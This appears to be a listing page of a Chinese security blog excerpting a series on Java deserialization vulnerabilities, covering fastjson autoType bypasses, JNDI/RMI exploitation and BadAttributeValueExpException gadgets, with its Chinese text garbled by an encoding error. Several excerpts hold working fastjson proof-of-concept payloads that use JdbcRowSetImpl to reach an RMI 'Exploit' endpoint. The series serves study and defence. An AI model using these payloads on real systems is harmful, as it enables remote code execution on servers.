JavaBeanDeserializer çš„ deserialze éƒ¨åˆ†ä»£ç ç¤ºä¾‹ã€‚
if (lexer.token() == JSONToken.LITERAL_STRING) { // ç¬¬äºŒä¸ª @type çš„å€¼ String typeName = lexer.stringVal(); lexer.nextToken(JSONToken.COMMA); if (typeName.equals(beanInfo.typeName)|| parser.isEnabled(Feature.IgnoreAutoType)) { if (lexer.token() == JSONToken.RBRACE) { lexer.nextToken(); break; } continue; } // è¿™é‡Œæ²¡æœ‰è·å–åˆ° deserializer ObjectDeserializer deserializer = getSeeAlso(config, this.beanInfo, typeName); Class&lt;?> userType = null; if (deserializer == null) { // ç¬¬ä¸€ä¸ª @type çš„å€¼ Class&lt;?> expectClass = TypeUtils.getClass(type); // åœ¨åŒ…å« expectClass æ—¶ä¼šç»•è¿‡ userType = config.checkAutoType(typeName, expectClass, lexer.getFeatures()); deserializer = parser.getConfig().getDeserializer(userType); } // å†æ¬¡è¿›è¡Œååºåˆ—åŒ–ï¼Œä¼šè§¦å‘åå°„æ„é€ å®ä¾‹ Object typedObject = deserializer.deserialze(parser, userType, fieldName); if (deserializer instanceof JavaBeanDeserializer) { JavaBeanDeserializer javaBeanDeserializer = (JavaBeanDeserializer) deserializer; if (typeKey != null) { FieldDeserializer typeKeyFieldDeser = javaBeanDeserializer.getFieldDeserializer(typeKey); if (typeKeyFieldDeser != null) { typeKeyFieldDeser.setValue(typedObject, typeName); } } } return (T) typedObject; } ParseConfig çš„ checkAutoType éƒ¨åˆ†ä»£ç ç¤ºä¾‹ï¼Œåªè¦ç¬¬äºŒä¸ª @type ç»§æ‰¿äº† ç¬¬ä¸€ä¸ª @type å³å¯è§¦å‘ã€‚
...</p></div><footer class=entry-footer><span title='2021-11-06 17:16:00 +0800 +0800'>åä¸€æœˆ 6, 2021</span>&nbsp;Â·&nbsp;5 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå…­ï¼‰fastjson 1.2.68 ç»•è¿‡åŸç†" href=https://www.typesafe.cn/posts/java-serialization-vulnerability-6/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäº”ï¼‰fastjson 1.2.47 ç»•è¿‡åŸç†</h2></header><div class=entry-content><p>å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚
Fastjson &lt;= 1.2.47 POC éšç€ fastjson çš„æ›´æ–°ï¼Œä»¥å¾€çš„å®‰å…¨æ¼æ´éƒ½è¢«å°å µæ‰äº†ï¼Œä½†é“é«˜ä¸€å°ºï¼Œé­”é«˜ä¸€ä¸ˆï¼Œå®‰å…¨äººå‘˜å‘ç°äº†ä¸€ä¸ªé€šæ€çš„æ¼æ´ï¼Œä»¥å¾€çš„å°å µæ‰‹æ®µéƒ½å¯ä»¥ç»•è¿‡ï¼Œç®—æ˜¯ä¸€ä¸ªé‡Œç¨‹ç¢‘çš„å‘ç°ã€‚
æˆ‘ä»¬é¦–å…ˆå°† fastjson å‡çº§åˆ° 1.2.47 ç‰ˆæœ¬ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬ä¹‹å‰çš„POCè¿›è¡Œæµ‹è¯•ã€‚
import com.alibaba.fastjson.JSON; public class Eval3 { public static void main(String[] args) throws Exception { String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}"; JSON.parse(payload); } } ä¸å‡ºæ„æ–™çš„è¯ä¼šå‡ºç°è¿™æ ·çš„é”™è¯¯æç¤ºä¿¡æ¯ï¼š
autoType is not support. com.sun.rowset.JdbcRowSetImpl è¿™æ˜¯å› ä¸º fastjson ä½¿ç”¨äº†é»‘åå•æœºåˆ¶ï¼Œç¦æ­¢å°† com.sun.rowset.JdbcRowSetImpl ååºåˆ—åŒ–ã€‚
ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨æ–°çš„ POC è¿›è¡Œæµ‹è¯•ï¼Œåˆå¯ä»¥åˆ©ç”¨æˆåŠŸäº†ã€‚
import com.alibaba.fastjson.JSON; public class Eval5 { public static void main(String[] args) throws Exception { String payload = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"b\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\",\"autoCommit\":true}}"; JSON.parse(payload); } } payload æ ¼å¼åŒ–ä¹‹åå¦‚ä¸‹ï¼š
{ "a": { "@type": "java.lang.Class", "val": "com.sun.rowset.JdbcRowSetImpl" }, "b": { "@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "rmi://localhost:1099/Exploit", "autoCommit": true } } Fastjson &lt;= 1.2.47 ç»•è¿‡åŸç† åœ¨å­¦ä¹ ç»•è¿‡åŸç†ä¹‹å‰ï¼Œäº†è§£ fastjson çš„åŸºæœ¬è§£ææµç¨‹è¿˜æ˜¯æœ‰å¿…è¦çš„ï¼Œæˆ‘ç”»äº†ä¸€å¼ ç±»å›¾ä»…ä¾›å‚è€ƒï¼Œå›¾ä¸­åªç”»äº†ä¸»è¦æµç¨‹ï¼Œè¿˜æœ‰å¾ˆå¤šç±»æ²¡æœ‰ç”»ã€‚
...</p></div><footer class=entry-footer><span title='2021-10-31 21:31:00 +0800 +0800'>åæœˆ 31, 2021</span>&nbsp;Â·&nbsp;3 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäº”ï¼‰fastjson 1.2.47 ç»•è¿‡åŸç†" href=https://www.typesafe.cn/posts/java-serialization-vulnerability-5/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå››ï¼‰JNDI + RMI/LDAP åœ¨fastjsonä¸­çš„åˆ©ç”¨åŸç†</h2></header><div class=entry-content><p>å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚
JNDI æ˜¯ä»€ä¹ˆ Javaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼Œç¼©å†™JNDIï¼‰ï¼Œæ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚
JNDI åŒ…å«åœ¨Java SEä¸­ï¼Œä¸éœ€è¦å¼•ç”¨ç¬¬ä¸‰æ–¹jarå³å¯ä½¿ç”¨ã€‚è¦ä½¿ç”¨ JNDI å¿…é¡»è¦æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡æä¾›è€…ã€‚JDK æœ¬èº«å·²ç»åŒ…æ‹¬äº†ä¸‹é¢å‡ ç§æœåŠ¡æä¾›è€…ã€‚
è½»é‡çº§ç›®å½•è®¿é—®åè®® (LDAP) CORBA å…¬å…±å¯¹è±¡æœåŠ¡å‘½åï¼ˆCOS namingï¼‰ Java è¿œç¨‹æ–¹æ³•è°ƒç”¨ (RMI) åŸŸåæœåŠ¡ (DNS) è¿™ä¹ˆè¯´èµ·æ¥è¿˜æ˜¯æœ‰ç‚¹æŠ½è±¡ï¼Œç®€å•ç†è§£å°±æ˜¯æœåŠ¡æä¾›è€…æä¾›ä¸€ä¸ªç±»ä¼¼Key Valueçš„æ•°æ®ï¼ŒJNDIå¯ä»¥é€šè¿‡è¿™ä¸ª Key è·å–åˆ°æœåŠ¡æä¾›è€…ä¸Šçš„æä¾›çš„Valueï¼Œå› æ­¤JNDIæ˜¯æ— æ³•å•ç‹¬ä½¿ç”¨çš„ã€‚
ä½¿ç”¨JNDIçš„æ–¹å¼ä¹Ÿå¾ˆç®€å•ï¼Œä¸‹é¢å°±æ˜¯ä¸€ä¸ªè·å–è¿œç¨‹å¯¹è±¡çš„ç¤ºä¾‹ä»£ç ã€‚
// åˆ›å»ºä¸€ä¸ªä¸Šä¸‹æ–‡å¯¹è±¡ InitialContext context = new InitialContext(); // æŸ¥æ‰¾ç›‘å¬åœ¨æœ¬åœ° 1099 ç«¯å£ä¸Š RMI æœåŠ¡çš„ Object å¯¹è±¡ Object obj = context.lookup("rmi://localhost:1099/Object"); RMI æ˜¯ä»€ä¹ˆ RMI æ˜¯ Remote Method Invocation çš„ç¼©å†™ï¼Œä¸­æ–‡å«ä¹‰ä¸ºè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œå³ä¸€ä¸ªJavaç¨‹åºè°ƒç”¨è°ƒç”¨å¦ä¸€ä¸ªJavaç¨‹åºæš´éœ²å‡ºæ¥çš„æ–¹æ³•ã€‚
RMI æœ‰ä¸‰ä¸ªæ¦‚å¿µï¼š
Registry : æä¾›æœåŠ¡æ³¨å†Œå’ŒæœåŠ¡è·å–ï¼ŒæœåŠ¡ç«¯å°†ç±»åç§°ï¼Œå­˜æ”¾åœ°å€æ³¨å†Œåˆ°Registryä¸­ï¼Œä»¥ä¾›å®¢æˆ·ç«¯è·å–ã€‚ Server : è¿œç¨‹æ–¹æ³•çš„æä¾›è€…ã€‚ Client : è¿œç¨‹æ–¹æ³•çš„è°ƒç”¨è€…ã€‚ è¿œç¨‹æ–¹æ³•çš„å®šä¹‰éœ€è¦æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š
å®ç° java.rmi.Remoteã€‚ ç»§æ‰¿ java.rmi.server.UnicastRemoteObjectã€‚ RMI ä½¿ç”¨ç¤ºä¾‹ Registry åˆ›å»º Registry
...</p></div><footer class=entry-footer><span title='2021-10-30 13:43:00 +0800 +0800'>åæœˆ 30, 2021</span>&nbsp;Â·&nbsp;6 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆå››ï¼‰JNDI + RMI/LDAP åœ¨fastjsonä¸­çš„åˆ©ç”¨åŸç†" href=https://www.typesafe.cn/posts/java-serialization-vulnerability-4/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸‰ï¼‰fastjson 1.2.24 Templateslmpl åˆ©ç”¨åŸç†</h2></header><div class=entry-content><p>å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚
Fastjson æ˜¯ä»€ä¹ˆ fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚
fastjsonç›¸å¯¹å…¶ä»–JSONåº“çš„ç‰¹ç‚¹æ˜¯å¿«ã€‚fastjsonåœ¨é˜¿é‡Œå·´å·´å¤§è§„æ¨¡ä½¿ç”¨ï¼Œåœ¨æ•°ä¸‡å°æœåŠ¡å™¨ä¸Šéƒ¨ç½²ï¼Œfastjsonåœ¨ä¸šç•Œè¢«å¹¿æ³›æ¥å—ã€‚åœ¨2012å¹´è¢«å¼€æºä¸­å›½è¯„é€‰ä¸ºæœ€å—æ¬¢è¿çš„å›½äº§å¼€æºè½¯ä»¶ä¹‹ä¸€ã€‚
ä»¥ä¸Šæ‘˜è‡ªFastjson GitHub ä»‹ç»ã€‚
ä½†è¿‘å¹´æ¥éšç€ Fastjson ä¸æ–­çˆ†å‡ºæ¼æ´ï¼Œå„å¤§ä¸­å°å‹å…¬å¸éƒ½é€æ¸å¼ƒç”¨ Fastjson ï¼Œç”šè‡³é˜¿é‡Œè‡ªå·±å¼€æºçš„æœåŠ¡æ³¨å†Œã€é…ç½®ç®¡ç†å¹³å° NACOS åœ¨ 1.3.0 ç‰ˆæœ¬ä¹‹åéƒ½ä» Fastjson æ›¿æ¢ä¸ºäº† Jackson (è¯¦è§ https://github.com/alibaba/nacos/releases/tag/1.3.0) ï¼Œå¯è§æ¼æ´å±å®³ä¹‹å¤§ã€‚
ä¸ºä»€ä¹ˆä¼šå¼ƒç”¨ Fastjson ï¼Ÿ æƒ³è¦ç ”ç©¶ä¸€ä¸ªäº§å“çš„æ¼æ´å…¶ä¸­æœ‰ä¸€æ¡å¾ˆå¥½çš„é€”å¾„å°±æ˜¯å»æŸ¥è¯¢ CVE ç¼–å·ï¼Œä½†æ˜¯æˆ‘åœ¨æ£€ç´¢ä¹‹åå‘ç° Fastjson åªæœ‰ CVE-2017-18349 è¿™ä¸€æ¡ï¼Œè€Œ Jackson ç«Ÿç„¶æœ‰é«˜è¾¾ 76 æ¡ã€‚
è¿™èƒ½å¦è¯æ˜ Fastjson æ¯” Jackson æ›´å®‰å…¨å‘¢ï¼Ÿç­”æ¡ˆå¹¶ä¸æ˜¯ï¼Œéƒ½æ˜¯åŠæ–¤å…«ä¸¤ï¼Œæœ‰äº› Fastjson é‡Œé¢å‡ºç°çš„æ¼æ´åœ¨ Jackson é‡Œé¢ä¹ŸåŒæ ·å­˜åœ¨ã€‚
é‚£ä¸ºä»€ä¹ˆä¼šæœ‰å…¬å¸å¼ƒç”¨ Fastjson å‘¢ï¼Ÿ
æˆ–è®¸æ˜¯ Jackson æœ‰æ›´å®Œå–„ä¸”å…¬å¼€çš„æ¼æ´ç®¡ç†æœºåˆ¶ï¼Œæˆ–è®¸æ˜¯å›½å¤–çš„æœˆäº®æ¯”è¾ƒåœ†ï¼Œæˆ–è®¸æ˜¯éšå¤§æµï¼Œä¹Ÿæˆ–è®¸æ˜¯ Fastjson ä»£ç è´¨é‡ä¸è¿‡å…³ï¼ˆçŸ¥ä¹ä¸Šæœ‰å¾ˆå¤šå›ç­”æ‰¹åˆ¤ Fastjson ä»£ç ç³Ÿç³•çš„ï¼‰ï¼ŒçœŸå®åŸå› å°±ä¸å¾—è€ŒçŸ¥äº†ã€‚
å°½ç®¡è¿‘å¹´æ¥æœ‰å…¬å¸ä¸æ–­å¼ƒç”¨ Fastjson ï¼Œä½†è¿˜æœ‰å¾ˆå¤šå…¬å¸åœ¨ä½¿ç”¨ï¼Œå¹¶ä¸”å·²ç»å¼€å‘ä¸Šçº¿çš„ç³»ç»Ÿæƒ³è¦æ›¿æ¢æˆ–è€…å‡çº§ Fastjson è¿˜éœ€è¦æ—¶é—´ï¼Œå› æ­¤æˆ‘ä»¬å¾ˆæœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹ Fastjson æ¼æ´çš„äº§å› ã€‚
Fastjson æ¼æ´äº§ç”ŸåŸå›  Fastjson ç¬¬ä¸€æ¬¡è¢«çˆ†å‡ºæœ‰æ¼æ´æ˜¯å®˜æ–¹åœ¨2017å¹´3æœˆ15æ—¥ä¸»åŠ¨æŠ«éœ²çš„ï¼Œè¯¦è§ https://github.com/alibaba/fastjson/wiki/security_update_20170315 ã€‚æ¼æ´å½±å“ 1.2.24 ä»¥åŠä¹‹å‰çš„ç‰ˆæœ¬ã€‚æˆ‘ä»¬ä»Šå¤©æ¥ç ”ç©¶ä¸€ä¸‹å½“ fastjson version &lt;= 1.2.24 æ—¶æ¼æ´æ˜¯å¦‚ä½•äº§ç”Ÿçš„ã€‚
...</p></div><footer class=entry-footer><span title='2021-10-21 22:56:00 +0800 +0800'>åæœˆ 21, 2021</span>&nbsp;Â·&nbsp;5 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸‰ï¼‰fastjson 1.2.24 Templateslmpl åˆ©ç”¨åŸç†" href=https://www.typesafe.cn/posts/java-serialization-vulnerability-3/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäºŒï¼‰æ–°ç‰ˆæœ¬JDKåˆ©ç”¨æ–¹å¼å’ŒShiroä¸¾ä¾‹</h2></header><div class=entry-content><p>å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚
æ–°çš„å¸Œæœ› 0x00 åœ¨ä¸Šä¸€èŠ‚ä¸­æˆ‘ä»¬ä»‹ç»äº† Java ååºåˆ—åŒ–æ¼æ´çš„æˆå› å’Œåˆ©ç”¨ commons-collections 3.1 æ­é… sun.reflect.annotation.AnnotationInvocationHandler å®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„æ–¹å¼ã€‚ä½†sun.reflect.annotation.AnnotationInvocationHandler çš„é—®é¢˜å·²ç»åœ¨æœ€æ–°ç‰ˆ jdk ä¸­ä¿®å¤ï¼Œå¯åˆ©ç”¨èŒƒå›´ä»…èƒ½å¤Ÿå±€é™äºæ—§ç‰ˆæœ¬çš„jdkã€‚ç»è¿‡å®‰å…¨äººå‘˜çš„å®¡è®¡ï¼Œå¦ä¸€ä¸ªç±» javax.management.BadAttributeValueExpException å‡ºç°åœ¨äº†å®‰å…¨äººå‘˜çš„è§†é‡ã€‚
javax.management.BadAttributeValueExpException ç»§æ‰¿è‡ª java.lang.Exceptionï¼Œjava.lang.Exception ç»§æ‰¿è‡ª java.lang.Throwableï¼Œè€Œ java.lang.Throwable å®ç°äº† java.io.Serializableã€‚å› æ­¤ javax.management.BadAttributeValueExpException ç¬¦åˆäº† å¯åºåˆ—åŒ– è¿™ä¸ªè¦æ±‚ï¼ŒåŒæ ·çš„å®ƒä¹Ÿå¢åŠ äº† readObject æ–¹æ³•ï¼Œè¿™ä¸ªç±»çš„å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š
package javax.management; import java.io.IOException; import java.io.ObjectInputStream; /** * Thrown when an invalid MBean attribute is passed to a query * constructing method. This exception is used internally by JMX * during the evaluation of a query. User code does not usually * see it. * * @since 1.5 */ public class BadAttributeValueExpException extends Exception { /* Serial version */ private static final long serialVersionUID = -3105272988410493376L; /** * @serial A string representation of the attribute that originated this exception. * for example, the string value can be the return of {@code attribute.toString()} */ private Object val; /** * Constructs a BadAttributeValueExpException using the specified Object to * create the toString() value. * * @param val the inappropriate value. */ public BadAttributeValueExpException (Object val) { this.val = val == null ? null : val.toString(); } /** * Returns the string representing the object. */ public String toString() { return "BadAttributeValueException: " + val; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get("val", null); if (valObj == null) { val = null; } else if (valObj instanceof String) { val= valObj; } else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) { val = valObj.toString(); } else { // the serialized object is from a version without JDK-8019292 fix val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName(); } } } å°ä¼™ä¼´ä»¬å¯èƒ½ä¼šå¾ˆè¿·èŒ«ï¼Œè¿™è¦ä½•ä»ä¸‹æ‰‹ï¼Ÿ
...</p></div><footer class=entry-footer><span title='2021-10-16 22:55:00 +0800 +0800'>åæœˆ 16, 2021</span>&nbsp;Â·&nbsp;7 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆäºŒï¼‰æ–°ç‰ˆæœ¬JDKåˆ©ç”¨æ–¹å¼å’ŒShiroä¸¾ä¾‹" href=https://www.typesafe.cn/posts/java-serialization-vulnerability-2/></a></article><article class=post-entry><header class=entry-header><h2 class=entry-hint-parent>Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸€ï¼‰Serializable</h2></header><div class=entry-content><p>å£°æ˜ æœ¬æ–‡ç« ä¸­æ‰€æœ‰å†…å®¹ä»…ä¾›å­¦ä¹ äº¤æµï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™ç”±æ­¤äº§ç”Ÿçš„ä¸€åˆ‡åæœå‡ä¸ä½œè€…æ— å…³ã€‚
åºåˆ—åŒ–çš„å®šä¹‰ åºåˆ—åŒ–æ˜¯æŒ‡å°†æ•°æ®ç»“æ„æˆ–å¯¹è±¡çŠ¶æ€è½¬æ¢æˆå¯å–ç”¨æ ¼å¼ï¼Œä»¥ç•™å¾…åç»­åœ¨ç›¸åŒæˆ–å¦ä¸€å°è®¡ç®—æœºç¯å¢ƒä¸­ï¼Œèƒ½æ¢å¤åŸå…ˆçŠ¶æ€çš„è¿‡ç¨‹ã€‚ä¾ç…§åºåˆ—åŒ–æ ¼å¼é‡æ–°è·å–å­—èŠ‚çš„ç»“æœæ—¶ï¼Œå¯ä»¥åˆ©ç”¨å®ƒæ¥äº§ç”Ÿä¸åŸå§‹å¯¹è±¡ç›¸åŒè¯­ä¹‰çš„å‰¯æœ¬ã€‚
Java ä¸­çš„åºåˆ—åŒ– Java è‡ªèº«æä¾›äº†åºåˆ—åŒ–çš„åŠŸèƒ½ï¼Œéœ€è¦å®ç° java.io.Serializable æ¥å£ï¼Œæ ‡æ˜è¯¥å¯¹è±¡æ˜¯å¯åºåˆ—åŒ–çš„ã€‚ java.io.Serializable æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œä¸éœ€è¦å¯¹è±¡å®ç°æ–¹æ³•ã€‚
ä»¥ä¸‹é¢è¿™æ®µä»£ç ä¸ºä¾‹ï¼Œå±•ç¤ºäº†ä¸€ä¸ªå¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚
import java.io.*; import java.nio.charset.StandardCharsets; import java.util.Base64; public class Eval0 { public static class Command implements Serializable { private String cmd; public String getCmd() { return cmd; } public void setCmd(String cmd) { this.cmd = cmd; } } public static void main(String[] args) throws Exception { // å®šä¹‰ä¸€ä¸ªå¯¹è±¡ Command command = new Command(); command.setCmd("calc"); System.out.println("åºåˆ—åŒ–å‰: " + command.getCmd()); // å°†ç”¨æˆ·åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„ ByteArrayOutputStream buffer = new ByteArrayOutputStream(); try (ObjectOutputStream outputStream = new ObjectOutputStream(buffer)) { outputStream.writeObject(command); } // å°†å­—èŠ‚æ•°ç»„è¿›è¡Œbase64ç¼–ç ï¼Œæ— è®ºæ˜¯é€šè¿‡ç½‘ç»œæˆ–è€…æ˜¯æ–‡ä»¶éƒ½å¯ä»¥å‘é€åˆ°å¦ä¸€ä¸ªç³»ç»Ÿè¿›è¡Œååºåˆ—åŒ– final String data = Base64.getEncoder().encodeToString(buffer.toByteArray()); System.out.println("åºåˆ—åŒ–å: " + data); // å°†base64ç¼–ç çš„æ•°æ®å†è§£ç ä¸ºå­—èŠ‚æ•°ç»„ final byte[] bytes = Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8)); // å°†å­—èŠ‚æ•°ç»„ååºåˆ—åŒ–ä¸ºå¯¹è±¡ ByteArrayInputStream b = new ByteArrayInputStream(bytes); try (ObjectInputStream input = new ObjectInputStream(b)) { final Command obj = (Command) input.readObject(); System.out.println("ååºåˆ—åŒ–: " + obj.getCmd()); } } } è¿è¡Œåè¾“å‡ºï¼š
...</p></div><footer class=entry-footer><span title='2021-10-14 23:00:00 +0800 +0800'>åæœˆ 14, 2021</span>&nbsp;Â·&nbsp;7 åˆ†é’Ÿ&nbsp;Â·&nbsp;dushixiang</footer><a class=entry-link aria-label="post link to Java ååºåˆ—åŒ–æ¼æ´åŸç†ï¼ˆä¸€ï¼‰Serializable" href=https://www.typesafe.cn/posts/java-serialization-vulnerability-1/></a></article><footer class=page-footer><nav class=pagination><a class=next href=https://www.typesafe.cn/page/2/>ä¸‹ä¸€é¡µ&nbsp;&nbsp;Â»</a></nav></footer></main><footer class=footer><span>&copy; 2025 <a href=https://www.typesafe.cn/>æ²¡æœ‰ç†æƒ³çš„äººä¸ä¼¤å¿ƒ</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>